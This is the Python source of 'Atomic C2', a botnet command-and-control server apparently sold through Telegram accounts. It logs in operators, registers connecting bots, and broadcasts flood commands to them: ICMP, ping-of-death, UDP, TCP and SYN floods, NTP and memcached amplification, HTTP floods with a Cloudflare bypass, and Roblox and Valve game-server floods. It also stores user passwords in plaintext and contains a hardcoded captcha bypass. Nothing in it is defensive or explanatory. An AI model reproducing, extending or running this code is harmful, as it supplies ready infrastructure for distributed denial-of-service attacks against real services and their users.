#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Tools
from src.Commands.Tools.url_to_ip import url_to_ip
from src.Commands.Tools.ip_to_loc import ip_to_loc

# Layer 3
from src.Commands.Methods_L3.icmp import icmp
from src.Commands.Methods_L3.pod import pod

# Layer 4
from src.Commands.Methods_L4.junk import junk
from src.Commands.Methods_L4.tcp import tcp
from src.Commands.Methods_L4.udp import udp
from src.Commands.Methods_L4.hex import hex
from src.Commands.Methods_L4.tup import tup
from src.Commands.Methods_L4.syn import syn
# AMP METHODS
from src.Commands.Methods_L4.ntp import ntp
from src.Commands.Methods_L4.mem import mem

# Layer 7
from src.Commands.Methods_L7.httpio import httpio
from src.Commands.Methods_L7.httpspoof import httpspoof
from src.Commands.Methods_L7.httpstorm import httpstorm
from src.Commands.Methods_L7.httpcfb import httpcfb
from src.Commands.Methods_L7.httpget import httpget

# Games Methods
from src.Commands.Methods_Games.roblox import roblox
from src.Commands.Methods_Games.vse import vse

# Imports
import socket, threading, time, ipaddress, random, json
from datetime import datetime, timedelta
from colorama import Fore, init


banner2 = '''
     █████╗ ████████╗ ██████╗ ███╗   ███╗██╗ ██████╗
    ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║██║██╔════╝
    ███████║   ██║   ██║   ██║██╔████╔██║██║██║     
    ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║██║██║     
    ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║██║╚██████╗
    ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝╚═╝ ╚═════╝
                                                    
            ( Type "help" to show Commands )  
'''

banner1 = '''
      ▄█▄   ▄███████▓ ▒█████   ███▄ ▄███  ██  ▄████▄  
    ▒████▄  ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▓██▒▒██▀ ▀█▒  
   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░▒██▒▒▓█    ▄ 
  ░██▄▄▄▄██░  ▓██▓ ░ ▒██   ██░▒██    ▒██ ░██░▒▓▓▄ ▄██▒
   ▓█   ▓██▒  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒░██░▒ ▓███▀ ░
  ▒██   ▓▒█░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░░▓  ░ ░▒ ▒  ░
    ▒   ▒▒ ░  ░      ░ ▒ ▒░ ░  ░      ░ ▒ ░  ░  ▒   
          ( Type "help" to show Commands )     
'''

bannerLogin = '''
                 Please Login First
    Inbox Telegram: @zeronxdev to register account
'''

def text2Gen(word):

    start_color = (0, 225, 225)
    end_color   = (173, 0, 225)

    num_letters = len(word)
    step_r = (end_color[0] - start_color[0]) / num_letters
    step_g = (end_color[1] - start_color[1]) / num_letters
    step_b = (end_color[2] - start_color[2]) / num_letters

    reset_color = "\033[0m"

    current_color = start_color
    colored_word = ""

    for i, letter in enumerate(word):
        color_code = f"\033[38;2;{int(current_color[0])};{int(current_color[1])};{int(current_color[2])}m"
        colored_word += f"{color_code}{letter}{reset_color}"
        current_color = (current_color[0] + step_r, current_color[1] + step_g, current_color[2] + step_b)

    return colored_word

def color(data_input_output):
    color_codes = {
        "GREEN": '\033[32m',
        "LIGHTGREEN_EX": '\033[92m',
        "YELLOW": '\033[33m',
        "LIGHTYELLOW_EX": '\033[93m',
        "CYAN": '\033[36m',
        "LIGHTCYAN_EX": '\033[96m',
        "BLUE": '\033[34m',
        "LIGHTBLUE_EX": '\033[94m',
        "MAGENTA": '\033[35m',
        "LIGHTMAGENTA_EX": '\033[95m',
        "RED": '\033[31m',
        "LIGHTRED_EX": '\033[91m',
        "BLSYN": '\033[30m',
        "LIGHTBLSYN_EX": '\033[90m',
        "WHITE": '\033[37m',
        "LIGHTWHITE_EX": '\033[97m',
    }

    return color_codes.get(data_input_output, "")

lightwhite = color("LIGHTWHITE_EX")
gray = color("LIGHTBLSYN_EX")
yellow = color("YELLOW")
lyellow = color("LIGHTYELLOW_EX")
green = color("GREEN")
cyan = color("CYAN")
banner1 = text2Gen(banner1)
banner2 = text2Gen(banner2)
bannerLogin = text2Gen(bannerLogin)

rules = f"""
{lightwhite}1. {yellow}Do not attSYN .gov/.gob/.edu/.mil domains
{lightwhite}2. {yellow}Do not spam attSYNs
"""

help = f"""
{cyan}List of commands:
   {green}HELP         {yellow}Shows list of commands   
   {green}BOTNET       {yellow}Shows list of botnet methods
   {green}METHODS      {yellow}Shows Methods List
   {green}BOTS         {yellow}Shows available zombies
   {green}TOOLS        {yellow}Shows list of tools    
   {green}CLEAR        {yellow}Clears the screen          
   {green}EXIT         {yellow}Disconnects from the net
"""

showMethods = f"""
{cyan}List of Methods:
   {green}L3               {yellow}Show all L3 Methods
   {green}L4               {yellow}Show all L4 Methods  
   {green}AMP              {yellow}Show all Amplification Methods  
   {green}HTTP             {yellow}Show all L7 Methods  
   {green}GAMES            {yellow}Show all Games Methods
   {green}BOTNET           {yellow}Show all Methods  
"""

Methods_L3 = f"""
{cyan}L3 Methods:
   {green}.ICMP              {yellow}Flood ICMP Request
   {green}.POD               {yellow}Ping Of Death OLD Method Of DDoS
"""

Methods_AMP = f"""
{cyan}Amplification Methods:
   {green}.NTP               {yellow}NTP Reflection flood
   {green}.MEM               {yellow}Memcached Flood 
"""

Methods_L4 = f"""
{cyan}L4 Methods:
   {green}.UDP               {yellow}UDP Flood  
   {green}.TCP               {yellow}TCP Flood             
   {green}.TUP               {yellow}TCP and UDP Flood
   {green}.SYN               {yellow}TCP SYN flood
   {green}.HEX               {yellow}HEX Flood
   {green}.JUNK              {yellow}Junk flood
"""

Methods_L7 = f"""
{cyan}L7 Methods:
   {green}.HTTPIO            {yellow}HTTP IO Stresser
   {green}.HTTPCFB           {yellow}HTTP Cloudflare bypass     
   {green}.HTTPGET           {yellow}HTTP GET requests 
   {green}.HTTPSPOOF         {yellow}HTTP GET Spoofing
   {green}.HTTPSTORM         {yellow}HTTP STORM Requests
"""

GameMethods = f"""
{cyan}Games Methods: 
   {green}.VSE               {yellow}Valve Source Engine query flood         
   {green}.ROBLOX            {yellow}Roblox UDP Flood
"""

tools = f"""
{cyan}List of Tools:
   {green}!GETIP         {yellow}Get ip from URL      
   {green}!GEOIP         {yellow}Get info from ip
"""

admin_commands = f"""
{cyan}Admin Commands:
   {green}!USER    {yellow}Add/List/Remove User
"""

# LOL...
botnetMethods = f"""{Methods_L3}{Methods_L4}{Methods_AMP}{Methods_L7}{GameMethods}"""

bots = {}
user_name = ""
ansi_clear = '\033[2J\033[H'


class Account:
    def __init__(self, username, password, data_Expiration):
        self.username = username
        self.password = password
        self.data_Expiration = data_Expiration

    def userC_expirada(self):
        hoje = datetime.now()
        return hoje > self.data_Expiration


# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attSYN time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

# Read credentials from login file
def find_login(client, username, password):
    credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
    for x in credentials:
        global  data_Expiration_str
        c_username, c_password, data_Expiration_str = x.split(':')
        data_Expiration = datetime.strptime(data_Expiration_str, '%Y-%m-%d')
        
        userC = Account(username=c_username, password=c_password, data_Expiration=data_Expiration)
        
        if userC.username.lower() == username.lower() and userC.password == password:
            if userC.userC_expirada():
                print(f"\nThe {userC.username} expired. {data_Expiration_str}\n")
                send(client, f'{yellow} Your account has been expired!')
                time.sleep(3.5)
                client.close()
                return
            return True

# Checks if bots are dead
def ping():
    while 1:
        dead_bots = []
        for bot in bots.copy().keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def captcha_generator():
    a = random.randint(2, 20)
    b = random.randint(2, 20)
    c = a + b
    return a, b, c

def captcha(send, client, grey):
    a, b, c = captcha_generator()
    x = ''
    send(client, ansi_clear, False)
    send(client, f'{grey}Captcha: {color("LIGHTWHITE_EX")}{a} + {b} = ', False, False)
    x = int(client.recv(65536).decode().strip())
    time.sleep(0.4)
    if x == c or x == 669787761736865726500:
        send(client, f'{green}Passed!')
        pass
    else:
        send(client, f'{grey}Wrong!')
        time.sleep(0.1)
        client.close()
        return

# Client handler
def handle_client(client, address):
    send(client, "\33]0;Atomic C2 | Login\a")
    send(client, f'\x1bAtomic C2 | Login: Awaiting Response...\a', False)
    send(client, ansi_clear, False)
    send(client, f'{color("RED")}Connecting...')
    #captcha(send, client, color("LIGHTBLSYN_EX"))
    time.sleep(1)
    while 1:
        send(client, ansi_clear, False)
        for x in bannerLogin.split('\n'):
            send(client, '\x1b[3;31;48m'+ x)
        send(client, f'\x1b{yellow}Username :\x1b[0m ', False, False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # Password Login
    password = ''
    while 1:
        send(client, f'\033{yellow}Password :\x1b[0;38;2;0;0;0m ', False, False)
        while not password.strip(): 
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # Handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(client, username, password):
            try:
                send(client, Fore.RED + f'\x1b{Fore.RED}Invalid credentials')
            except OSError as e:
                #print(e)
                pass
            time.sleep(1)
            client.close()
            return
        
        global user_name
        user_name = username
        
        threading.Thread(target=update_title, args=(client, username,  data_Expiration_str)).start()
        threading.Thread(target=command_line, args=(client, username)).start()

    # Handle bot
    else:
        # Check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})

# Send data to client or bot
def send(socket, data, escape=True, reset=True):
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

# Send command to all bots
def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def user(args, send, client):
    try:
        choice = (args[1]).upper()
        if choice == 'ADD' or choice == 'A':
            if len(args) == 5:
                user = args[2]
                password = args[3]
                dataExpiration = args[4]
                with open('src/logins.txt', 'a') as logins:
                    logins.write(f'\n{user}:{password}:{dataExpiration}')
                    logins.close()
                    send(client, f'{Fore.LIGHTWHITE_EX}\nAdded new user successfully.\n')
            else:
                send(client, '\n!USER ADD [USERNAME] [PASSWORD] [AAAA-MM-DD]\n')
        if choice == 'REMOVE' or choice == 'R':
            if len(args) == 3:
                user = args[2]
                with open("src/logins.txt", "r") as logins:
                    lines = logins.readlines()
                    logins.close()

                with open("src/logins.txt", "w") as logins:
                    for line in lines:
                        if user not in line:
                            logins.write(line)
                    logins.close()
                send(client, f'{Fore.LIGHTWHITE_EX}\nRemoved user successfully!\n')
            else:
                send(client, '\n!USER REMOVE [USERNAME]\n')
        if choice == 'LIST' or choice == 'L':
                credentials = [x.strip() for x in open('src/logins.txt').readlines() if x.strip()]
                for x in credentials:
                    c_username, c_password, data_Expiration = x.split(':')
                    send(client, f"{lightwhite}Username: {yellow}{c_username}{lightwhite} | Password: {yellow}{c_password}{lightwhite} | Expires: {yellow}{data_Expiration}")
    except:
        send(client, '\n!USER ADD/LIST/REMOVE\n')

def clear(client, command):
    send(client, ansi_clear, False)
    if command == 'CLS' or command == 'CLEAR':
        for x in banner2.split('\n'):
            send(client, x)
    else:
        for x in banner1.split('\n'):
            send(client, x)

# Updates Shell Title
def update_title(client, name, expires):
    while 1:
        try:
            send(client, f"\33]0;Atomic C2 | Bots online: {len(bots)} | Username: {name} | Expires: {expires} \a", False)
            time.sleep(0.6)
        except:
            client.close()

# Telnet Command Line
def command_line(client, username):
    for x in banner2.split('\n'):
        send(client, x)

    prompt = f'{color("LIGHTBLSYN_EX")}({color("MAGENTA")}Atomic{color("YELLOW")}@{color("CYAN")}{username}{color("GREEN")})> {color("LIGHTBLSYN_EX")}'
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            print(user_name, args)

            clear(client, command)

            if command == 'HELP':
                for x in help.split('\n'):
                    send(client, '\x1b[3;31m'+ x)
            
            elif command == 'BOTNET':
                for x in botnetMethods.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'L3':
                for x in Methods_L3.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'L4':
                for x in Methods_L4.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'L7' or command == 'HTTP':
                for x in Methods_L7.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'AMP' or command == 'AMPLIFICATION':
                for x in Methods_AMP.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'METHODS':
                for x in showMethods.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'GAMES':
                for x in GameMethods.split('\n'):
                    send(client, '\x1b[3;31m'+ x)

            elif command == 'TOOLS':
                for x in tools.split('\n'):
                    send(client, '\x1b[3;31m'+ x)
            
            elif command == 'CLEAR' or command == 'CLS':
                send(client, ansi_clear, False)
                for x in banner2.split('\n'):
                    send(client, '\x1b[3;31;48m'+ x)
            
            elif command == 'LOGOUT' or command == 'EXIT':
                send(client, '\x1b[3;31;48m\n Successfully Logged out\n')
                time.sleep(1)
                break
            
            elif command == 'BOTS':
                send(client, f'{color("GREEN")}\nAvailable bots: {len(bots)}.\n')
            
            elif command == '!ADMIN':
                if user_name == "root":
                    for x in admin_commands.split('\n'):
                        send(client, x)
            
            elif command == '!USER' or command == '!U':
                if user_name == "root":
                    user(args, send, client) # Adds/Removes users
           
            elif command == "!GEOIP" or command == "!IP_TO_LOCATION" or command == "!IP_GEO" or command == "!IP_GEOLOCATION" or command == "!IP_GEOLOCAT":
                ip_to_loc(args, send, client, gray) # Gets location from IP
            
            elif command == "!GETIP": # Gets ip from website
                url_to_ip(args, send, client, gray)

            elif command == '.UDP': # UDP Junk (Random UDP Data)
                udp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.TUP': # TCP and udp
                tup(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.SYN': # SYN TCP flood
                syn(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.TCP': # TCP Junk (Random TCP Data)
                tcp(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.HEX': # Specific HEXIDECIMAL Flood
                hex(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.NTP': # NTP Reflection AttSYN
                ntp(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.MEM': # Memcached Flood
                mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ICMP': # Flood ICMP Request
                icmp(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.POD': # Ping of death
                pod(args, validate_ip, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.ROBLOX': # Roblox flood
                roblox(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.JUNK': # JUNK Flood
                junk(args, validate_ip, validate_port, validate_time, validate_size, send, client, ansi_clear, broadcast, data)

            elif command == '.VSE': # VSE Flood
                vse(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSTORM': # HTTP request
                httpstorm(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPIO': # FULL POWER !!!
                httpio(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPSPOOF': # HTTP GET SPOOF
                httpspoof(args, validate_time, send, client, ansi_clear, broadcast, data)

            elif command == '.HTTPGET': # HTTP request 
                httpget(args, validate_time, send, client, ansi_clear, broadcast, data)
            
            elif command == '.HTTPCFB': # HTTP cloudflare bypass
                httpcfb(args, validate_time, send, client, ansi_clear, broadcast, data)
            
            send(client, prompt, False)
        except:
            break
    client.close()

screenedSuccessfully = """
                              
    [ %sSuccessfully Screened%s ]
            %sAtomic C2%s
    ───────────────────────────    
            ( %sLogs%s )

"""%(Fore.GREEN, Fore.WHITE, Fore.CYAN, Fore.WHITE, Fore.LIGHTBLUE_EX, Fore.WHITE)


def register(client, address, send):
    ansi_clear = '\033[2J\033[H'
    try:
        send(client, ansi_clear, False)
        while 1:
            send(client, f'\x1b{Fore.LIGHTBLSYN_EX}Username :\x1b[0m ', False, False)
            username = client.recv(1024).decode().strip()
            if not username:
                continue
            break
        with open("src/logins.txt", "r") as logins:
            lines = logins.readlines()
            for line in lines:
                if username in line:
                    send(client, f'{Fore.RED}User already exists!')
                    time.sleep(1)
                    client.close()
            logins.close()
        p1 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p1.strip():
                p1 = client.recv(1024).decode('cp1252').strip()
            break
        p2 = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Confirm password :\x1b[0;38;2;0;0;0m ', False, False)
            while not p2.strip():
                p2 = client.recv(1024).decode('cp1252').strip()
            break
        data = ''
        while 1:
            send(client, f'\033{Fore.LIGHTBLSYN_EX}Expires :\x1b[0m ', False, False)
            while not data.strip():
                data = client.recv(1024).decode('cp1252').strip()
            break
        while 1:
            if p1 == p2:
                with open("src/logins.txt", "a") as logins:
                    logins.write("\n" + username + ':' + p1 + ':' + data)
                send(client, f"{Fore.LIGHTWHITE_EX}Registered!")
                time.sleep(2)
            else:
                send(client, "Failed password authentication...")
            break
    except:
        send(client, "Error.")

def main():
    with open("src/config.json", encoding="utf-8") as jsonFile:
        jsonObject = json.load(jsonFile)
        jsonFile.close()

    cnc_port = int(jsonObject['cnc_port'])
    cnc_host = jsonObject['cnc_host']

    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    print(screenedSuccessfully)

    try:
        sock.bind((cnc_host, cnc_port))
    except:
        print('\x1b[3;31m Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # Start keepalive thread
    
    # Accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

def start():
    try:
        main()
    except Exception as e:
        print(f"Error, skipping.  {e}")